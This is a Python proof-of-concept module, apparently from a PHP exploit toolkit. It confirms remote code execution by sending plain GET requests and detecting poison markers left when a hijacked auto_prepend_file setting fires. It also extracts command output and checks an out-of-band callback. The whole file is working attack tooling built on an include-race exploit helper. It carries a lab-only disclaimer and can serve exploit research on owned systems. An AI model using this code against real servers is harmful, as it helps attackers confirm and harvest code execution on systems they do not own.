#!/usr/bin/env python3
# INDEX: sink-free auto-include fire confirmation | all | needs no-include landing page
"""Sink-free PG auto-include success oracle.

A poison marker emitted by a PLAIN GET to a no-include landing page can ONLY come
from PG(auto_prepend_file)/PG(auto_append_file) firing (the page has no include
param), so the marker's presence is a sink-free success signal: it CONFIRMS that
a candidate write landed the auto-include field, with no application
serialize()/reflect channel anywhere. `confirm_rce` fires plain requests until the
oracle reports the payload ran (optionally corroborated by an oob callback). Pure
stdlib, `python3 -I` safe. Lab/analysis use only, on systems you own.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import sys

_POC = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_POC))  # poc/


def _load(fname):
    path = os.path.join(_POC, fname)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, fname)
    spec = importlib.util.spec_from_file_location(fname[:-3], path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_POC, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(mod)
    return mod


race = _load("routes/include_race.py")   # http_raw + extract + poison markers

MARK_S, MARK_E = race.MARK_S, race.MARK_E


def plain_probe(host, port, base="/plain.php", sid=None, timeout=10):
    """One PLAIN GET to the no-include landing page. Returns the response body
    bytes. A poison marker in the body can ONLY come from PG(auto_prepend_file)
    firing (the page has no include param) -> the built-in success oracle."""
    cookie = f"Cookie: PHPSESSID={sid}\r\n" if sid else ""
    raw = (f"GET {base} HTTP/1.1\r\nHost: {host}\r\n{cookie}"
           f"Connection: close\r\n\r\n").encode()
    try:
        return race.http_raw(host, port, raw, timeout=timeout)
    except OSError:
        return b""


def oracle_fired(body):
    """True iff the auto_prepend payload executed (marker present)."""
    return MARK_S.encode() in body


def oracle_output(body):
    """Command output captured between the poison markers, if any."""
    return race.extract(body)


def confirm_rce(host, port, base="/plain.php", sid=None, tries=6, oob=None,
                verbose=True):
    """Fire plain requests until the prepend oracle reports the payload ran.
    Returns (ok, cmd_output, probes)."""
    for i in range(1, tries + 1):
        body = plain_probe(host, port, base=base, sid=sid)
        if oracle_fired(body):
            out = oracle_output(body)
            if verbose:
                print(f"[oracle] auto_prepend FIRED on plain GET {base} "
                      f"(probe {i}); marker present")
                if out:
                    print(f"[oracle] cmd output: {out.strip()}")
            return True, out, i
        if oob is not None and oob.captures:
            if verbose:
                print(f"[oracle] oob callback fired (probe {i})")
            return True, oob.captures[0]["body"].decode("utf-8", "replace"), i
    return False, None, tries


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="sink-free PG auto-include success oracle (plain-GET probe)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8134)
    ap.add_argument("--base", default="/plain.php")
    ap.add_argument("--sid", default=None)
    ap.add_argument("--tries", type=int, default=6)
    a = ap.parse_args(argv)
    ok, out, probes = confirm_rce(a.host, a.port, base=a.base, sid=a.sid,
                                  tries=a.tries)
    print(f"fired={ok} probes={probes} output={(out or '').strip()!r}")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
